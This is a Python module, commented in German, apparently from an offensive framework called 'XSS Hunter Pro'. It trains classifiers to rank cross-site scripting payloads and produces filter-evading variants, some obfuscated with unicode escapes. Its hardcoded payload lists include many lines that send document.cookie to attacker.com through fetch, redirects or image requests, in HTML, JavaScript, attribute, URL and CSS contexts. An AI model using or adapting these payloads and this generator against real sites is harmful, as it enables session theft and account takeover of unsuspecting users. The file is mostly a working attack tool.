#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - ML Payload Optimizer
=============================================

Diese Datei implementiert die ML-basierte Payload-Optimierung für das XSS Hunter Framework.

Autor: Anonymous
Lizenz: MIT
Version: 0.2.0
"""

import os
import sys
import logging
import json
import random
import re
import time
import numpy as np
from typing import Dict, List, Optional, Any, Tuple, Union

# Konfiguration für Logging
logger = logging.getLogger("XSSHunterPro.MLPayloadOptimizer")

# Versuche, scikit-learn zu importieren
try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.model_selection import train_test_split
    from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score
    SKLEARN_AVAILABLE = True
    logger.info("scikit-learn gefunden, ML-Funktionalität aktiviert")
except ImportError:
    SKLEARN_AVAILABLE = False
    logger.warning("scikit-learn nicht gefunden, ML-Funktionalität deaktiviert")


class MLPayloadOptimizer:
    """Klasse für die ML-basierte Optimierung von XSS-Payloads."""

    def __init__(self, config: Dict[str, Any] = None):
        """
        Initialisiert den ML Payload Optimizer.

        Args:
            config: Die Konfiguration für den Optimizer.
        """
        self.config = config or {}
        self.model = None
        self.vectorizer = None
        self.context_models = {}
        self.training_data = {}
        self.fallback_mode = not SKLEARN_AVAILABLE
        
        # Lade die Trainingsdaten
        self._load_training_data()
        
        # Initialisiere die Modelle
        if not self.fallback_mode:
            self._initialize_models()
        
        logger.info("ML Payload Optimizer initialisiert")

    def _load_training_data(self) -> None:
        """Lädt die Trainingsdaten für die Modelle."""
        try:
            # Lade die Payloads aus den Payload-Dateien
            payload_files = self.config.get("payload_files", [
                "payloads/basic.json",
                "payloads/advanced.json",
                "payloads/dom.json",
                "payloads/waf_bypass.json"
            ])
            
            # Initialisiere die Trainingsdaten für verschiedene Kontexte
            self.training_data = {
                "html": {"payloads": [], "labels": []},
                "javascript": {"payloads": [], "labels": []},
                "attribute": {"payloads": [], "labels": []},
                "url": {"payloads": [], "labels": []},
                "css": {"payloads": [], "labels": []}
            }
            
            # Lade die Payloads aus den Dateien
            for payload_file in payload_files:
                if os.path.exists(payload_file):
                    with open(payload_file, "r") as f:
                        try:
                            payloads = json.load(f)
                            
                            # Verarbeite die Payloads
                            for payload in payloads:
                                if isinstance(payload, dict):
                                    # Strukturierte Payload-Daten
                                    payload_text = payload.get("payload", "")
                                    context = payload.get("context", "html")
                                    success_rate = payload.get("success_rate", 0.5)
                                    
                                    if context in self.training_data and payload_text:
                                        self.training_data[context]["payloads"].append(payload_text)
                                        self.training_data[context]["labels"].append(1 if success_rate >= 0.5 else 0)
                                else:
                                    # Einfache Payload-Strings
                                    # Versuche, den Kontext zu erraten
                                    context = self._guess_context(payload)
                                    
                                    if context in self.training_data and payload:
                                        self.training_data[context]["payloads"].append(payload)
                                        self.training_data[context]["labels"].append(1)  # Annahme: Alle Payloads in den Dateien sind erfolgreich
                        except json.JSONDecodeError:
                            logger.error(f"Fehler beim Parsen der Payload-Datei: {payload_file}")
                else:
                    logger.warning(f"Payload-Datei nicht gefunden: {payload_file}")
            
            # Füge einige bekannte fehlgeschlagene Payloads hinzu (für das Training)
            failed_payloads = [
                {"payload": "<script>", "context": "html", "label": 0},
                {"payload": "alert(", "context": "javascript", "label": 0},
                {"payload": "onerror=", "context": "attribute", "label": 0},
                {"payload": "%3Cscript", "context": "url", "label": 0},
                {"payload": "expression(", "context": "css", "label": 0}
            ]
            
            for failed in failed_payloads:
                context = failed["context"]
                if context in self.training_data:
                    self.training_data[context]["payloads"].append(failed["payload"])
                    self.training_data[context]["labels"].append(failed["label"])
            
            # Protokolliere die Anzahl der geladenen Payloads
            for context, data in self.training_data.items():
                logger.info(f"{len(data['payloads'])} Payloads für Kontext '{context}' geladen")
                
        except Exception as e:
            logger.error(f"Fehler beim Laden der Trainingsdaten: {e}")
            # Initialisiere leere Trainingsdaten
            self.training_data = {
                "html": {"payloads": [], "labels": []},
                "javascript": {"payloads": [], "labels": []},
                "attribute": {"payloads": [], "labels": []},
                "url": {"payloads": [], "labels": []},
                "css": {"payloads": [], "labels": []}
            }

    def _guess_context(self, payload: str) -> str:
        """
        Versucht, den Kontext einer Payload zu erraten.

        Args:
            payload: Die Payload.

        Returns:
            Der vermutete Kontext.
        """
        if not payload:
            return "html"
            
        payload = payload.lower()
        
        # JavaScript-Kontext
        if "javascript:" in payload or "eval(" in payload or "function(" in payload:
            return "javascript"
            
        # URL-Kontext
        if "%3c" in payload or "%3e" in payload or "%22" in payload or "%27" in payload:
            return "url"
            
        # Attribut-Kontext
        if "onload=" in payload or "onerror=" in payload or "onclick=" in payload:
            return "attribute"
            
        # CSS-Kontext
        if "expression(" in payload or "url(" in payload or "{" in payload:
            return "css"
            
        # Standard: HTML-Kontext
        return "html"

    def _initialize_models(self) -> None:
        """Initialisiert die ML-Modelle für verschiedene Kontexte."""
        if self.fallback_mode:
            logger.warning("ML-Funktionalität deaktiviert, überspringe Modellinitialisierung")
            return
            
        try:
            # Initialisiere den Vektorisierer
            self.vectorizer = TfidfVectorizer(
                analyzer='char',
                ngram_range=(2, 5),
                max_features=1000
            )
            
            # Initialisiere Modelle für jeden Kontext
            for context, data in self.training_data.items():
                if len(data["payloads"]) > 10 and len(set(data["labels"])) > 1:
                    # Genug Daten für das Training
                    logger.info(f"Initialisiere Modell für Kontext '{context}'")
                    
                    # Vektorisiere die Payloads
                    X = self.vectorizer.fit_transform(data["payloads"])
                    y = np.array(data["labels"])
                    
                    # Teile die Daten in Trainings- und Testdaten auf
                    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
                    
                    # Trainiere das Modell
                    model = RandomForestClassifier(n_estimators=100, random_state=42)
                    model.fit(X_train, y_train)
                    
                    # Evaluiere das Modell
                    y_pred = model.predict(X_test)
                    accuracy = accuracy_score(y_test, y_pred)
                    
                    logger.info(f"Modell für Kontext '{context}' trainiert, Genauigkeit: {accuracy:.2f}")
                    
                    # Speichere das Modell
                    self.context_models[context] = {
                        "model": model,
                        "vectorizer": self.vectorizer,
                        "accuracy": accuracy
                    }
                else:
                    logger.warning(f"Nicht genug Daten für das Training des Modells für Kontext '{context}'")
                    
        except Exception as e:
            logger.error(f"Fehler bei der Initialisierung der Modelle: {e}")
            self.fallback_mode = True

    def optimize_payload(self, payload: str, context: str = "html") -> Dict[str, Any]:
        """
        Optimiert eine Payload für einen bestimmten Kontext.

        Args:
            payload: Die zu optimierende Payload.
            context: Der Kontext, für den die Payload optimiert werden soll.

        Returns:
            Ein Dictionary mit der optimierten Payload und zusätzlichen Informationen.
        """
        if self.fallback_mode or context not in self.context_models:
            # Fallback-Modus: Einfache Optimierung ohne ML
            return self._fallback_optimize_payload(payload, context)
            
        try:
            # Vektorisiere die Payload
            X = self.context_models[context]["vectorizer"].transform([payload])
            
            # Vorhersage der Erfolgswahrscheinlichkeit
            model = self.context_models[context]["model"]
            probability = model.predict_proba(X)[0][1]  # Wahrscheinlichkeit für Klasse 1 (Erfolg)
            
            if probability >= 0.5:
                # Payload ist wahrscheinlich erfolgreich
                logger.info(f"Payload für Kontext '{context}' ist wahrscheinlich erfolgreich (p={probability:.2f})")
                return {
                    "success": True,
                    "payload": payload,
                    "optimized": False,
                    "probability": probability,
                    "context": context
                }
            else:
                # Payload ist wahrscheinlich nicht erfolgreich, versuche zu optimieren
                logger.info(f"Payload für Kontext '{context}' ist wahrscheinlich nicht erfolgreich (p={probability:.2f}), versuche zu optimieren")
                
                # Generiere Variationen der Payload
                variations = self._generate_payload_variations(payload, context)
                
                # Bewerte die Variationen
                best_variation = None
                best_probability = probability
                
                for variation in variations:
                    X_var = self.context_models[context]["vectorizer"].transform([variation])
                    var_probability = model.predict_proba(X_var)[0][1]
                    
                    if var_probability > best_probability:
                        best_variation = variation
                        best_probability = var_probability
                
                if best_variation and best_probability > probability:
                    # Optimierte Payload gefunden
                    logger.info(f"Optimierte Payload für Kontext '{context}' gefunden (p={best_probability:.2f})")
                    return {
                        "success": True,
                        "payload": best_variation,
                        "original_payload": payload,
                        "optimized": True,
                        "probability": best_probability,
                        "context": context
                    }
                else:
                    # Keine bessere Variation gefunden
                    logger.info(f"Keine bessere Variation für Payload im Kontext '{context}' gefunden")
                    return {
                        "success": True,
                        "payload": payload,
                        "optimized": False,
                        "probability": probability,
                        "context": context
                    }
                    
        except Exception as e:
            logger.error(f"Fehler bei der Optimierung der Payload: {e}")
            return self._fallback_optimize_payload(payload, context)

    def _fallback_optimize_payload(self, payload: str, context: str = "html") -> Dict[str, Any]:
        """
        Fallback-Methode für die Payload-Optimierung ohne ML.

        Args:
            payload: Die zu optimierende Payload.
            context: Der Kontext, für den die Payload optimiert werden soll.

        Returns:
            Ein Dictionary mit der optimierten Payload und zusätzlichen Informationen.
        """
        logger.info(f"Verwende Fallback-Optimierung für Payload im Kontext '{context}'")
        
        # Einfache Heuristiken für verschiedene Kontexte
        if context == "html":
            # HTML-Kontext
            if "<script>" not in payload.lower() and "</script>" not in payload.lower():
                # Füge Script-Tags hinzu, wenn sie fehlen
                optimized_payload = f"<script>{payload}</script>"
                return {
                    "success": True,
                    "payload": optimized_payload,
                    "original_payload": payload,
                    "optimized": True,
                    "probability": 0.7,
                    "context": context
                }
        elif context == "javascript":
            # JavaScript-Kontext
            if "alert" in payload and "(" not in payload:
                # Füge Klammern hinzu, wenn sie fehlen
                optimized_payload = payload.replace("alert", "alert(1)")
                return {
                    "success": True,
                    "payload": optimized_payload,
                    "original_payload": payload,
                    "optimized": True,
                    "probability": 0.7,
                    "context": context
                }
        elif context == "attribute":
            # Attribut-Kontext
            if "=" in payload and "\"" not in payload and "'" not in payload:
                # Füge Anführungszeichen hinzu, wenn sie fehlen
                optimized_payload = f"{payload}=\"x\""
                return {
                    "success": True,
                    "payload": optimized_payload,
                    "original_payload": payload,
                    "optimized": True,
                    "probability": 0.7,
                    "context": context
                }
        elif context == "url":
            # URL-Kontext
            if "<" in payload and not payload.lower().startswith("%3c"):
                # Kodiere spezielle Zeichen
                optimized_payload = payload.replace("<", "%3C").replace(">", "%3E")
                return {
                    "success": True,
                    "payload": optimized_payload,
                    "original_payload": payload,
                    "optimized": True,
                    "probability": 0.7,
                    "context": context
                }
        elif context == "css":
            # CSS-Kontext
            if "expression" in payload.lower() and "(" not in payload:
                # Füge Klammern hinzu, wenn sie fehlen
                optimized_payload = payload.replace("expression", "expression(alert(1))")
                return {
                    "success": True,
                    "payload": optimized_payload,
                    "original_payload": payload,
                    "optimized": True,
                    "probability": 0.7,
                    "context": context
                }
        
        # Keine Optimierung notwendig oder möglich
        return {
            "success": True,
            "payload": payload,
            "optimized": False,
            "probability": 0.5,
            "context": context
        }

    def _generate_payload_variations(self, payload: str, context: str) -> List[str]:
        """
        Generiert Variationen einer Payload für einen bestimmten Kontext.

        Args:
            payload: Die Payload, für die Variationen generiert werden sollen.
            context: Der Kontext, für den die Variationen generiert werden sollen.

        Returns:
            Eine Liste von Payload-Variationen.
        """
        variations = []
        
        # Kontext-spezifische Variationen
        if context == "html":
            # HTML-Kontext
            variations.extend([
                f"<script>{payload}</script>",
                f"<img src=x onerror=\"{payload}\">",
                f"<svg onload=\"{payload}\">",
                f"<body onload=\"{payload}\">",
                f"<iframe onload=\"{payload}\">",
                f"<details ontoggle=\"{payload}\">",
                f"<div onclick=\"{payload}\">click me</div>"
            ])
        elif context == "javascript":
            # JavaScript-Kontext
            variations.extend([
                f"eval({payload})",
                f"setTimeout({payload}, 100)",
                f"(function(){{{payload}}})()",
                f"new Function('{payload}')",
                f"fetch('').then(()=>{{{payload}}})"
            ])
        elif context == "attribute":
            # Attribut-Kontext
            variations.extend([
                f"onmouseover=\"{payload}\"",
                f"onclick=\"{payload}\"",
                f"onerror=\"{payload}\"",
                f"onload=\"{payload}\"",
                f"onfocus=\"{payload}\""
            ])
        elif context == "url":
            # URL-Kontext
            variations.extend([
                f"javascript:{payload}",
                f"data:text/html,<script>{payload}</script>",
                f"%3Cscript%3E{payload}%3C/script%3E",
                f"#<script>{payload}</script>"
            ])
        elif context == "css":
            # CSS-Kontext
            variations.extend([
                f"expression({payload})",
                f"url(javascript:{payload})",
                f"behavior:url(javascript:{payload})"
            ])
        
        # Allgemeine Variationen
        if "alert" in payload:
            variations.extend([
                payload.replace("alert", "prompt"),
                payload.replace("alert", "confirm"),
                payload.replace("alert", "console.log"),
                payload.replace("alert", "eval")
            ])
        
        # Obfuskations-Variationen
        if "alert" in payload:
            variations.extend([
                payload.replace("alert", "al\\u0065rt"),
                payload.replace("alert", "al\"+\"ert"),
                payload.replace("alert", "\\u0061lert"),
                payload.replace("alert", "\\u0061\\u006cert")
            ])
        
        # Entferne Duplikate und die ursprüngliche Payload
        variations = list(set(variations))
        if payload in variations:
            variations.remove(payload)
        
        return variations

    def generate_payloads(self, context: str = "html", count: int = 10, use_ml: bool = True) -> Dict[str, Any]:
        """
        Generiert optimierte Payloads für einen bestimmten Kontext.

        Args:
            context: Der Kontext, für den die Payloads generiert werden sollen.
            count: Die Anzahl der zu generierenden Payloads.
            use_ml: Ob ML für die Generierung verwendet werden soll.

        Returns:
            Ein Dictionary mit den generierten Payloads und zusätzlichen Informationen.
        """
        if not use_ml or self.fallback_mode or context not in self.context_models:
            # Fallback-Modus: Verwende vordefinierte Payloads
            return self._fallback_generate_payloads(context, count)
            
        try:
            # Wähle erfolgreiche Payloads aus den Trainingsdaten
            successful_payloads = []
            for i, label in enumerate(self.training_data[context]["labels"]):
                if label == 1:
                    successful_payloads.append(self.training_data[context]["payloads"][i])
            
            if len(successful_payloads) < count:
                # Nicht genug erfolgreiche Payloads, generiere Variationen
                base_payloads = successful_payloads if successful_payloads else ["<script>alert(1)</script>"]
                
                for base_payload in base_payloads:
                    variations = self._generate_payload_variations(base_payload, context)
                    
                    # Bewerte die Variationen
                    for variation in variations:
                        X_var = self.context_models[context]["vectorizer"].transform([variation])
                        probability = self.context_models[context]["model"].predict_proba(X_var)[0][1]
                        
                        if probability >= 0.5:
                            successful_payloads.append(variation)
                            
                            if len(successful_payloads) >= count:
                                break
                    
                    if len(successful_payloads) >= count:
                        break
            
            # Wähle die besten Payloads
            if len(successful_payloads) > count:
                successful_payloads = successful_payloads[:count]
            
            return {
                "success": True,
                "payloads": successful_payloads,
                "count": len(successful_payloads),
                "context": context,
                "use_ml": True
            }
            
        except Exception as e:
            logger.error(f"Fehler bei der Generierung von Payloads: {e}")
            return self._fallback_generate_payloads(context, count)

    def _fallback_generate_payloads(self, context: str = "html", count: int = 10) -> Dict[str, Any]:
        """
        Fallback-Methode für die Payload-Generierung ohne ML.

        Args:
            context: Der Kontext, für den die Payloads generiert werden sollen.
            count: Die Anzahl der zu generierenden Payloads.

        Returns:
            Ein Dictionary mit den generierten Payloads und zusätzlichen Informationen.
        """
        logger.info(f"Verwende Fallback-Generierung für Payloads im Kontext '{context}'")
        
        # Vordefinierte Payloads für verschiedene Kontexte
        predefined_payloads = {
            "html": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe onload=alert(1)>",
                "<details ontoggle=alert(1)>",
                "<div onclick=alert(1)>click me</div>",
                "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                "<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>",
                "<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie</script>"
            ],
            "javascript": [
                "alert(1)",
                "eval('alert(1)')",
                "setTimeout('alert(1)', 100)",
                "(function(){alert(1)})()",
                "new Function('alert(1)')",
                "fetch('').then(()=>{alert(1)})",
                "console.log(document.cookie)",
                "document.location='https://attacker.com/steal?cookie='+document.cookie",
                "new Image().src='https://attacker.com/steal?cookie='+document.cookie",
                "fetch('https://attacker.com/steal?cookie='+document.cookie)"
            ],
            "attribute": [
                "onmouseover=\"alert(1)\"",
                "onclick=\"alert(1)\"",
                "onerror=\"alert(1)\"",
                "onload=\"alert(1)\"",
                "onfocus=\"alert(1)\"",
                "onmouseover=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\"",
                "onclick=\"document.location='https://attacker.com/steal?cookie='+document.cookie\"",
                "onerror=\"new Image().src='https://attacker.com/steal?cookie='+document.cookie\"",
                "onload=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\"",
                "onfocus=\"console.log(document.cookie)\""
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "#<script>alert(1)</script>",
                "javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)",
                "javascript:document.location='https://attacker.com/steal?cookie='+document.cookie",
                "javascript:new Image().src='https://attacker.com/steal?cookie='+document.cookie",
                "data:text/html,<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                "%3Cscript%3Efetch('https://attacker.com/steal?cookie='+document.cookie)%3C/script%3E",
                "#<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>"
            ],
            "css": [
                "expression(alert(1))",
                "url(javascript:alert(1))",
                "behavior:url(javascript:alert(1))",
                "expression(fetch('https://attacker.com/steal?cookie='+document.cookie))",
                "url(javascript:fetch('https://attacker.com/steal?cookie='+document.cookie))",
                "behavior:url(javascript:document.location='https://attacker.com/steal?cookie='+document.cookie)",
                "expression(new Image().src='https://attacker.com/steal?cookie='+document.cookie)",
                "url(javascript:console.log(document.cookie))",
                "behavior:url(javascript:new Image().src='https://attacker.com/steal?cookie='+document.cookie)",
                "expression(document.location='https://attacker.com/steal?cookie='+document.cookie)"
            ]
        }
        
        # Wähle Payloads für den angegebenen Kontext
        if context in predefined_payloads:
            payloads = predefined_payloads[context][:count]
        else:
            # Fallback auf HTML-Kontext
            payloads = predefined_payloads["html"][:count]
        
        return {
            "success": True,
            "payloads": payloads,
            "count": len(payloads),
            "context": context,
            "use_ml": False
        }

    def update_model(self, payload: str, context: str, success: bool) -> bool:
        """
        Aktualisiert das Modell mit einer neuen Payload und ihrem Erfolg.

        Args:
            payload: Die Payload.
            context: Der Kontext der Payload.
            success: Ob die Payload erfolgreich war.

        Returns:
            True, wenn das Modell aktualisiert wurde, sonst False.
        """
        if self.fallback_mode or context not in self.training_data:
            logger.warning(f"ML-Funktionalität deaktiviert oder Kontext '{context}' nicht unterstützt, überspringe Modellaktualisierung")
            return False
            
        try:
            # Füge die Payload zu den Trainingsdaten hinzu
            self.training_data[context]["payloads"].append(payload)
            self.training_data[context]["labels"].append(1 if success else 0)
            
            # Aktualisiere das Modell, wenn genug neue Daten vorhanden sind
            if len(self.training_data[context]["payloads"]) % 10 == 0:
                logger.info(f"Aktualisiere Modell für Kontext '{context}'")
                
                # Vektorisiere die Payloads
                X = self.vectorizer.fit_transform(self.training_data[context]["payloads"])
                y = np.array(self.training_data[context]["labels"])
                
                # Teile die Daten in Trainings- und Testdaten auf
                X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
                
                # Trainiere das Modell
                model = RandomForestClassifier(n_estimators=100, random_state=42)
                model.fit(X_train, y_train)
                
                # Evaluiere das Modell
                y_pred = model.predict(X_test)
                accuracy = accuracy_score(y_test, y_pred)
                
                logger.info(f"Modell für Kontext '{context}' aktualisiert, Genauigkeit: {accuracy:.2f}")
                
                # Speichere das Modell
                self.context_models[context] = {
                    "model": model,
                    "vectorizer": self.vectorizer,
                    "accuracy": accuracy
                }
            
            return True
            
        except Exception as e:
            logger.error(f"Fehler bei der Aktualisierung des Modells: {e}")
            return False

    def save_models(self, directory: str = "models") -> bool:
        """
        Speichert die trainierten Modelle.

        Args:
            directory: Das Verzeichnis, in dem die Modelle gespeichert werden sollen.

        Returns:
            True, wenn die Modelle gespeichert wurden, sonst False.
        """
        if self.fallback_mode:
            logger.warning("ML-Funktionalität deaktiviert, überspringe Modellspeicherung")
            return False
            
        try:
            # Erstelle das Verzeichnis, wenn es nicht existiert
            if not os.path.exists(directory):
                os.makedirs(directory)
                
            # Speichere die Trainingsdaten
            with open(os.path.join(directory, "training_data.json"), "w") as f:
                # Konvertiere die Trainingsdaten in ein speicherbares Format
                serializable_data = {}
                for context, data in self.training_data.items():
                    serializable_data[context] = {
                        "payloads": data["payloads"],
                        "labels": data["labels"]
                    }
                json.dump(serializable_data, f)
                
            # Speichere die Modelle
            if SKLEARN_AVAILABLE:
                import joblib
                
                for context, model_data in self.context_models.items():
                    model_path = os.path.join(directory, f"model_{context}.joblib")
                    vectorizer_path = os.path.join(directory, f"vectorizer_{context}.joblib")
                    
                    joblib.dump(model_data["model"], model_path)
                    joblib.dump(model_data["vectorizer"], vectorizer_path)
                    
                logger.info(f"Modelle in Verzeichnis '{directory}' gespeichert")
                return True
            else:
                logger.warning("scikit-learn nicht verfügbar, überspringe Modellspeicherung")
                return False
                
        except Exception as e:
            logger.error(f"Fehler beim Speichern der Modelle: {e}")
            return False

    def load_models(self, directory: str = "models") -> bool:
        """
        Lädt die trainierten Modelle.

        Args:
            directory: Das Verzeichnis, aus dem die Modelle geladen werden sollen.

        Returns:
            True, wenn die Modelle geladen wurden, sonst False.
        """
        if self.fallback_mode:
            logger.warning("ML-Funktionalität deaktiviert, überspringe Modellladung")
            return False
            
        try:
            # Prüfe, ob das Verzeichnis existiert
            if not os.path.exists(directory):
                logger.warning(f"Verzeichnis '{directory}' existiert nicht, überspringe Modellladung")
                return False
                
            # Lade die Trainingsdaten
            training_data_path = os.path.join(directory, "training_data.json")
            if os.path.exists(training_data_path):
                with open(training_data_path, "r") as f:
                    self.training_data = json.load(f)
                    
            # Lade die Modelle
            if SKLEARN_AVAILABLE:
                import joblib
                
                for context in self.training_data.keys():
                    model_path = os.path.join(directory, f"model_{context}.joblib")
                    vectorizer_path = os.path.join(directory, f"vectorizer_{context}.joblib")
                    
                    if os.path.exists(model_path) and os.path.exists(vectorizer_path):
                        model = joblib.load(model_path)
                        vectorizer = joblib.load(vectorizer_path)
                        
                        self.context_models[context] = {
                            "model": model,
                            "vectorizer": vectorizer,
                            "accuracy": 0.0  # Unbekannte Genauigkeit
                        }
                        
                logger.info(f"Modelle aus Verzeichnis '{directory}' geladen")
                return True
            else:
                logger.warning("scikit-learn nicht verfügbar, überspringe Modellladung")
                return False
                
        except Exception as e:
            logger.error(f"Fehler beim Laden der Modelle: {e}")
            return False


# Beispiel für die Verwendung
if __name__ == "__main__":
    # Konfiguriere Logging
    logging.basicConfig(level=logging.INFO)
    
    # Erstelle den ML Payload Optimizer
    optimizer = MLPayloadOptimizer()
    
    # Optimiere eine Payload
    result = optimizer.optimize_payload("<script>alert(1)</script>", "html")
    print(f"Optimierte Payload: {result}")
    
    # Generiere Payloads
    payloads = optimizer.generate_payloads("html", 5)
    print(f"Generierte Payloads: {payloads}")
